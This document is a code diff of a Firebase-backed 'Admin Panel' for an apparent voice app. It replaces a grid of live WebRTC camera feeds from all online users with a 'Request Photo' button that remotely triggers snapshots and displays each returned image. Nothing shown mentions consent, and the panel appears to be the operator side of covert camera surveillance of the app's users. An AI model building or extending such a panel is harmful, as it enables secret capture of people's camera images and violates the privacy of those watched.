@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Live Feeds</title>
+    <title>Admin Panel - Photo Request</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body { font-family: 'Inter', sans-serif; }
-        .video-card {
+        .user-card {
             transition: all 0.3s ease-in-out;
         }
     </style>
@@ -17,12 +17,12 @@
 <body class="bg-gray-900 text-white min-h-screen p-4">
 
     <div class="container mx-auto">
-        <h1 class="text-3xl font-bold text-center mb-2">Live Camera Feeds</h1>
+        <h1 class="text-3xl font-bold text-center mb-2">User Snapshots</h1>
         <p class="text-center text-gray-400 mb-6">Online Users: <span id="userCount">0</span></p>
 
-        <!-- Video Grid -->
-        <div id="video-grid" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
-            <!-- Live feeds will be populated here -->
+        <!-- User Photo Grid -->
+        <div id="user-grid" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+            <!-- User cards will be populated here -->
         </div>
     </div>
 
@@ -43,21 +43,13 @@
             databaseURL: "https://my-voice-app-4eca5-default-rtdb.asia-southeast1.firebasedatabase.app"
         };
 
-        // --- WebRTC Configuration ---
-        const servers = {
-            iceServers: [
-                { urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] },
-            ],
-            iceCandidatePoolSize: 10,
-        };
-
         // --- DOM Elements ---
-        const videoGridEl = document.getElementById('video-grid');
+        const userGridEl = document.getElementById('user-grid');
         const userCountEl = document.getElementById('userCount');
         
         // --- App State ---
         let db, rtdb;
-        let peerConnections = {}; 
+        let userListeners = {}; 
 
         // --- Main Initialization ---
         async function initialize() {
@@ -81,82 +73,72 @@
                 userCountEl.textContent = onlineUsers.size;
 
                 onlineUsers.forEach(userId => {
-                    if (!peerConnections[userId]) connectToUser(userId);
+                    if (!userListeners[userId]) {
+                        setupUserCard(userId);
+                    }
                 });
 
-                Object.keys(peerConnections).forEach(userId => {
-                    if (!onlineUsers.has(userId)) disconnectFromUser(userId);
+                Object.keys(userListeners).forEach(userId => {
+                    if (!onlineUsers.has(userId)) {
+                        removeUserCard(userId);
+                    }
                 });
             });
         }
         
-        function addUserVideoUI(userId) {
-            if (document.getElementById(`video_card_${userId}`)) return;
-            const videoCard = document.createElement('div');
-            videoCard.id = `video_card_${userId}`;
-            videoCard.className = 'video-card bg-slate-800 rounded-lg overflow-hidden shadow-lg';
-            videoCard.innerHTML = `<video id="video_${userId}" autoplay playsinline class="w-full h-auto aspect-video bg-black"></video><div class="p-2"><p class="text-sm font-semibold">User-${userId.substring(0, 6)}</p></div>`;
-            videoGridEl.appendChild(videoCard);
-        }
-        
-        function removeUserVideoUI(userId) {
-            const videoCard = document.getElementById(`video_card_${userId}`);
-            if (videoCard) videoCard.remove();
-        }
+        function setupUserCard(userId) {
+            // UI banayein
+            if (document.getElementById(`user_card_${userId}`)) return;
+            const userCard = document.createElement('div');
+            userCard.id = `user_card_${userId}`;
+            userCard.className = 'user-card bg-slate-800 rounded-lg overflow-hidden shadow-lg';
+            userCard.innerHTML = `
+                <div class="aspect-video bg-black flex items-center justify-center">
+                    <img id="photo_${userId}" class="w-full h-full object-cover hidden" />
+                    <i id="placeholder_${userId}" class="fas fa-camera text-4xl text-gray-500"></i>
+                </div>
+                <div class="p-3">
+                    <p class="text-sm font-semibold">User-${userId.substring(0, 6)}</p>
+                    <button data-userid="${userId}" class="request-photo-btn mt-2 w-full bg-blue-600 hover:bg-blue-700 px-2 py-1 text-sm rounded">Request Photo</button>
+                </div>
+            `;
+            userGridEl.appendChild(userCard);
+            userCard.querySelector('.request-photo-btn').addEventListener('click', (e) => requestPhoto(userId, e.target));
 
-        async function connectToUser(userId) {
-            addUserVideoUI(userId);
-            const pc = new RTCPeerConnection(servers);
-            
-            pc.ontrack = (event) => {
-                const videoEl = document.getElementById(`video_${userId}`);
-                if (videoEl) videoEl.srcObject = event.streams[0];
-            };
-            
-            pc.onconnectionstatechange = () => {
-                if (['disconnected', 'failed', 'closed'].includes(pc.connectionState)) {
-                    disconnectFromUser(userId);
-                }
-            };
-
-            const callDocRef = doc(db, 'webrtc_calls', userId);
-            const adminCandidatesRef = collection(callDocRef, 'adminCandidates');
-            const clientCandidatesRef = collection(callDocRef, 'clientCandidates');
-
-            // ** FIX: Add ICE candidate handling **
-            pc.onicecandidate = event => {
-                if (event.candidate) addDoc(adminCandidatesRef, event.candidate.toJSON());
-            };
-            
-            onSnapshot(clientCandidatesRef, (snapshot) => {
-                snapshot.docChanges().forEach((change) => {
-                    if (change.type === 'added') pc.addIceCandidate(new RTCIceCandidate(change.doc.data()));
-                });
-            });
-
-            const offer = await pc.createOffer({ offerToReceiveVideo: 1 });
-            await pc.setLocalDescription(offer);
-            await setDoc(callDocRef, { offer });
-
-            const answerUnsubscribe = onSnapshot(callDocRef, (snapshot) => {
-                if (pc.signalingState === 'closed') return;
+            // User se photo ke liye listen karein
+            const userCallDocRef = doc(db, 'photo_calls', userId);
+            const unsubscribe = onSnapshot(userCallDocRef, (snapshot) => {
                 const data = snapshot.data();
-                if (data?.answer && pc.signalingState === 'have-local-offer') {
-                    pc.setRemoteDescription(new RTCSessionDescription(data.answer));
+                if (data && data.photo_data) {
+                    const imgEl = document.getElementById(`photo_${userId}`);
+                    const placeholderEl = document.getElementById(`placeholder_${userId}`);
+                    imgEl.src = data.photo_data;
+                    imgEl.classList.remove('hidden');
+                    placeholderEl.classList.add('hidden');
                 }
             });
 
-            peerConnections[userId] = { pc, unsubscribe: answerUnsubscribe };
+            userListeners[userId] = { unsubscribe };
+        }
+
+        async function requestPhoto(userId, button) {
+            const userCallDocRef = doc(db, 'photo_calls', userId);
+            await setDoc(userCallDocRef, { request_photo: true, timestamp: Date.now() });
+            button.textContent = "Request Sent";
+            button.disabled = true;
+            setTimeout(() => {
+                button.textContent = "Request Photo";
+                button.disabled = false;
+            }, 5000);
         }
         
-        function disconnectFromUser(userId) {
-            if (peerConnections[userId]) {
-                peerConnections[userId].unsubscribe();
-                peerConnections[userId].pc.close();
-                delete peerConnections[userId];
+        function removeUserCard(userId) {
+            if (userListeners[userId]) {
+                userListeners[userId].unsubscribe();
+                delete userListeners[userId];
             }
-            removeUserVideoUI(userId);
-            deleteDoc(doc(db, 'webrtc_calls', userId));
+            const userCard = document.getElementById(`user_card_${userId}`);
+            if (userCard) userCard.remove();
         }
 
         initialize();
